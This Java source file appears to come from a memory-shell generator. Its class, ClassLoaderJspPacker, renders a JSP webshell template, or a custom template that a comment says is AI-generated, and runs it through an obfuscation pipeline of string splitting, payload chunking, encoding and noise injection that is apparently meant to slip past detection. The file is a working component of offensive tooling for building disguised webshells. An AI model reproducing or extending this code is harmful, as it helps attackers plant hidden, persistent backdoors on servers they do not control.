package org.leo.jmg.mem.packer.jsp;

import org.leo.jmg.mem.packer.ClassPackerConfig;
import org.leo.jmg.mem.packer.Packer;
import org.leo.jmg.mem.packer.PackerMeta;
import org.leo.jmg.mem.packer.TemplateRenderer;
import org.leo.jmg.mem.packer.Util;

@PackerMeta(
    name = "ClassLoaderJSP", group = "Jsp", order = 1,
    obfuscationSteps = {
        "SPLIT_STRING_LITERALS",
        "CHUNK_PAYLOAD",
        "GHOST_BITS_ENCODE",
        "INJECT_SCRIPTLET_NOISE",
        "INSERT_SCRIPT_NOISE",
        "UNICODE_ENCODE_JSP",
        "WRAP_HTML_JS"
    }
)
public class ClassLoaderJspPacker implements Packer {

    private final String jspTemplate = Util.loadTemplateFromResource("/memshell-template/shell.jsp");

    @Override
    public String pack(ClassPackerConfig config) {
        // AI 生成的自定义模板优先；未提供时回退到内置模板
        String tpl = (config.getCustomTemplate() != null && !config.getCustomTemplate().trim().isEmpty())
                ? config.getCustomTemplate()
                : jspTemplate;
        String code = TemplateRenderer.render(tpl, config);
        JspObfuscationPipeline pipeline = (config.getJspObfuscationSteps() != null)
                ? JspObfuscationPipeline.fromStepIds(config.getJspObfuscationSteps())
                : JspObfuscationPipeline.jspDefault();
        return pipeline.apply(code);
    }
}
